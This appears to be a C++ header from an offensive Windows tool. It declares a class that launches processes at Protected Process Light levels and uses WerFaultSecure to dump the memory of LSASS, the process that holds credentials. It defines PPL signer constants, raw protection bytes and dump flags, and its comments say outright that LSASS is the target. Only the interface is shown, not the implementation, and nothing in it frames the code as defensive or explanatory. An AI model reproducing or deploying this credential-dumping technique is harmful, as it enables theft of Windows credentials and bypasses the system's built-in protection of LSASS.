#pragma once
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#pragma comment(lib, "advapi32.lib")

// ============================================================
// Protection level constants (winnt.h / phnt)
// ============================================================
#ifndef PROTECTION_LEVEL_WINTCB_LIGHT
#define PROTECTION_LEVEL_WINTCB_LIGHT       0x00000049
#endif
#ifndef PROTECTION_LEVEL_WINDOWS
#define PROTECTION_LEVEL_WINDOWS            0x00000040
#endif
#ifndef PROTECTION_LEVEL_WINDOWS_LIGHT
#define PROTECTION_LEVEL_WINDOWS_LIGHT      0x00000048
#endif
#ifndef PROTECTION_LEVEL_ANTIMALWARE_LIGHT
#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT  0x00000023
#endif
#ifndef PROTECTION_LEVEL_LSA_LIGHT
#define PROTECTION_LEVEL_LSA_LIGHT          0x00000022
#endif
#ifndef PROTECTION_LEVEL_WINTCB
#define PROTECTION_LEVEL_WINTCB             0x00000041
#endif
#ifndef PROTECTION_LEVEL_NONE
#define PROTECTION_LEVEL_NONE               0xFFFFFFFF
#endif

// ============================================================
// PPL raw byte values used with NtCreateUserProcess
//   PS_PROTECTION { Type:3, Audit:1, Signer:4 }
//   Type:   PsProtectedTypeNone=0, Protected=1, ProtectedLight=2
//   Signer: None=0,Authenticode=1,CodeGen=2,Antimalware=3,
//           Lsa=4,Windows=5,WinTcb=6,WinSystem=7
// ============================================================
#define PPL_RAW_WINTCB_LIGHT        0x62    // Type=2(Light) | Signer=6(WinTcb)<<4
#define PPL_RAW_WINDOWS_LIGHT       0x52    // Type=2(Light) | Signer=5(Windows)<<4
#define PPL_RAW_ANTIMALWARE_LIGHT   0x32    // Type=2(Light) | Signer=3(Antimalware)<<4
#define PPL_RAW_LSA_LIGHT           0x42    // Type=2(Light) | Signer=4(Lsa)<<4
#define PPL_RAW_WINTCB_FULL         0x61    // Type=1(Full)  | Signer=6(WinTcb)<<4
#define PPL_RAW_WINDOWS_FULL        0x51    // Type=1(Full)  | Signer=5(Windows)<<4

// ============================================================
// Dump type for WerFaultSecure
// ============================================================
#define DUMP_TYPE_MINI              0x00000001  // MiniDump
#define DUMP_TYPE_FULL              0x00041408  // FullDump (MiniDumpWithFullMemory etc.)
#define DUMP_TYPE_DEFAULT           268310      // 0x41836 — value used in practice

class PPLProcessCreator
{
private:
    HANDLE m_hProcess;
    HANDLE m_hThread;

public:
    PPLProcessCreator() : m_hProcess(nullptr), m_hThread(nullptr) {}

    ~PPLProcessCreator()
    {
        if (m_hProcess) { CloseHandle(m_hProcess); m_hProcess = nullptr; }
        if (m_hThread) { CloseHandle(m_hThread);  m_hThread = nullptr; }
    }

    // Query protection level of an existing process
    DWORD        GetPPLProtectionLevel(DWORD processId);
    std::wstring GetPPLProtectionLevelName(DWORD protectionLevel);

    // Create a PPL process via Win32 CreateProcessW + PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL
    // protectionLevel: one of PROTECTION_LEVEL_* constants
    // commandLine    : full command line (mutable, as required by CreateProcessW)
    // inheritHandles : whether to inherit handles (needed for WerFaultSecure file handles)
    // waitForExit    : block until the created process exits
    // Returns true on success; fills GetProcessHandle()/GetThreadHandle()
    bool CreatePPLProcess(
        DWORD         protectionLevel,
        std::wstring& commandLine,
        bool          inheritHandles = true,
        bool          waitForExit = true,
        DWORD         timeoutMs = INFINITE);

    // Convenience: create WerFaultSecure dump process
    // targetPID/targetTID : LSASS pid and main thread id
    // hDump/hEnc/hCancel  : inheritable file/event handles
    // dumpType            : dump flags (default DUMP_TYPE_DEFAULT)
    bool CreateWerFaultSecureDump(
        const std::wstring& werFaultPath,
        DWORD               targetPID,
        DWORD               targetTID,
        HANDLE              hDump,
        HANDLE              hEnc,
        HANDLE              hCancel,
        DWORD               protectionLevel = PROTECTION_LEVEL_WINTCB_LIGHT,
        DWORD               dumpType = DUMP_TYPE_DEFAULT,
        DWORD               timeoutMs = 30000);

    HANDLE GetProcessHandle();
    HANDLE GetThreadHandle();

    // Get the exit code after CreatePPLProcess with waitForExit=true
    DWORD GetExitCode();
};